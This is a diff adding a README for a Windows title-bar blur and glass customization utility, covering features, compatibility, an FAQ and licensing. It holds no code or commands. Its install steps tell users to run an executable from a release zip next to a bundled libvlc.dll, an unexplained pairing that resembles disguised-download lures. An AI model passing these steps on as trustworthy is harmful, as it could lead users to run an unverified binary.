@@ -1,0 +1,173 @@
+Windows DWM Blur & Glass Customizer is a free, open-source Windows desktop customization utility that brings Aero Glass, Acrylic, Mica, and advanced blur effects to system title bars. Personalize your Windows 10 and Windows 11 desktop with configurable transparency, colors, and visual effects through an easy-to-use graphical interface — no command line required.
+
+⬇️ Installation
+
+Download the Windows application
+
+1. Open the repository's Releases page.
+2. Download the latest release archive Windows DWM Blur & Glass Customizer 4.4.5.zip.
+3. Extract the archive into a folder of your choice.
+4. Keep Windows DWM Blur & Glass Customizer 4.4.5.exe and libvlc.dll together in that folder.
+5. Double-click Windows DWM Blur & Glass Customizer 4.4.5.exe to launch the application.
+
+✨ Features
+
+- 🌫️ Global DWM Blur Effects — Customize Desktop Window Manager blur effects to give Windows applications a modern translucent appearance.
+- 🪟 Aero Glass Transparency — Bring back the classic Windows Aero-inspired glass appearance with configurable blur and transparency.
+- 🎨 Acrylic Material Effects — Apply translucent Acrylic-style materials with adjustable visual characteristics.
+- 🧊 Windows 11 Mica Support — Enable Mica and Mica Alt-inspired title bar effects on compatible Windows 11 systems.
+- 🌈 Custom Title Bar Colors — Adjust title bar blending, foreground text colors, and appearance settings to match your desktop theme.
+- 🌗 Automatic Light and Dark Modes — Configure appearance behavior for different Windows color modes.
+- ⚙️ Advanced DWM Customization — Fine-tune blur methods, visual parameters, and additional title bar appearance options.
+
+🖼️ Overview
+
+Supported Visual Effects
+
+| Effect | Description | Compatibility |
+|---|---|---|
+| Aero | Classic glass-inspired transparency | Windows 10 / 11 |
+| Blur | Customizable background blur | Windows 10 / 11 |
+| Acrylic | Modern translucent material | Windows 10 / 11 |
+| Mica | Windows 11-inspired backdrop | Compatible Windows 11 builds |
+| Mica Alt | Alternative Mica appearance | Compatible Windows 11 builds |
+
+Actual effect availability depends on your Windows build, rendering method, and system configuration.
+
+Desktop Customization Possibilities
+
+- Customize the appearance of global system title bars.
+- Adjust blur intensity and visual blending.
+- Configure title bar background and foreground colors.
+- Experiment with different transparency styles.
+- Create consistent appearances across supported applications.
+- Combine Windows personalization settings with compatible third-party themes.
+
+🚀 Usage
+
+1. Install the application using the official release package.
+2. Launch the graphical interface to access available Desktop Window Manager customization options.
+3. Choose a visual effect such as Blur, Aero, Acrylic, or Mica.
+4. Adjust appearance settings including colors, blur parameters, and theme behavior.
+5. Apply your configuration and inspect the updated Windows title bar appearance.
+6. Fine-tune your desktop until the selected effect matches your preferred visual style.
+
+🖥️ Windows Compatibility
+
+The application is designed for modern Windows desktop environments.
+
+| Platform | Support |
+|---|---|
+| Windows 10 | Supported |
+| Windows 11 | Supported |
+| Windows 11 Mica | Supported on compatible builds |
+| Third-party Windows themes | Compatibility depends on the theme |
+| Older Windows versions | Not guaranteed |
+
+Important: Some effects depend on Windows rendering capabilities and may behave differently between operating system builds. Certain Windows Insider releases may introduce compatibility limitations.
+
+🎨 Customization Options
+
+Blur and Transparency
+
+Explore different blur approaches to achieve the appearance you want:
+
+- Custom blur configurations.
+- Accent-based blur appearance.
+- System backdrop effects.
+- Adjustable blur intensity.
+- Custom title bar blending.
+
+Title Bar Appearance
+
+Personalize the details that make your Windows desktop unique:
+
+- Custom background colors.
+- Configurable title bar text colors.
+- Light and dark appearance settings.
+- Windows 7-inspired title bar button styling.
+- Additional visual refinements for supported applications.
+
+Third-Party Theme Compatibility
+
+The customization approach is designed to complement Windows personalization and supported third-party desktop themes.
+
+Compatibility with other DWM customization utilities can vary. Avoid enabling multiple tools that modify the same system rendering components simultaneously.
+
+🔒 Security & Privacy
+
+Your desktop customization software should be transparent and trustworthy.
+
+- Open source: Review the available source code and understand how the application works.
+- No telemetry: No intentional analytics, usage tracking, or telemetry functionality is required for its core operation.
+- No account required: Desktop customization does not require creating an online account.
+- Official downloads: Obtain executable packages from the project's official GitHub Releases page.
+- Report vulnerabilities: Submit suspected security problems through the repository's private security reporting feature when available. For ordinary bugs, use GitHub Issues.
+
+Download safety: Avoid repackaged executables and unofficial download mirrors. Verify that release assets originate from the project's official distribution channel.
+
+System modification notice: DWM customization interacts with Windows desktop rendering components. Create a restore point before experimenting with advanced system-level appearance modifications.
+
+🛠️ Technical Details
+
+| Component | Details |
+|---|---|
+| Application type | Native Windows desktop utility |
+| Primary technology | C++ |
+| Graphics integration | Desktop Window Manager (DWM) |
+| Main purpose | System title bar customization |
+| Target operating systems | Windows 10 and Windows 11 |
+| Interface | Graphical desktop interface |
+
+The project focuses on customizing system-level visual presentation rather than requiring individual application developers to modify their programs.
+
+❓ Frequently Asked Questions
+
+Does this work on Windows 10?
+
+Yes. Windows 10 is supported, although individual visual effects depend on the operating system build and available rendering interfaces.
+
+Does it support Windows 11 Mica?
+
+Yes. Mica-style effects are supported on compatible Windows 11 configurations.
+
+Can I use Aero Glass and Acrylic effects?
+
+Yes. The available effect options include Aero-inspired glass, blur, and Acrylic materials.
+
+Do I need programming experience?
+
+No. The application provides a graphical interface for configuring desktop appearance without requiring command-line knowledge.
+
+Does it change the appearance of every application?
+
+The goal is global title bar customization, but actual results depend on how individual applications interact with Windows rendering and supported desktop interfaces.
+
+Can I use third-party Windows themes?
+
+Yes, compatible third-party themes can be used alongside the customization features. Individual theme combinations may require additional configuration.
+
+Is it suitable for Windows Insider builds?
+
+Some experimental Windows builds may change DWM behavior. Compatibility with every Insider release cannot be guaranteed.
+
+🤝 Contributing
+
+Contributions from Windows customization enthusiasts and developers are welcome.
+
+You can help improve the project by:
+
+- Reporting reproducible bugs.
+- Suggesting additional visual effects.
+- Improving Windows version compatibility.
+- Enhancing documentation.
+- Submitting code improvements.
+- Testing different Windows configurations.
+
+Before submitting a pull request, describe the proposed change and test it on a compatible Windows installation.
+
+📄 License
+
+Released under the MIT License. See the LICENSE file for the complete license terms.
+
+Make Windows your own with Aero Glass, Acrylic, Mica, and customizable DWM blur effects.
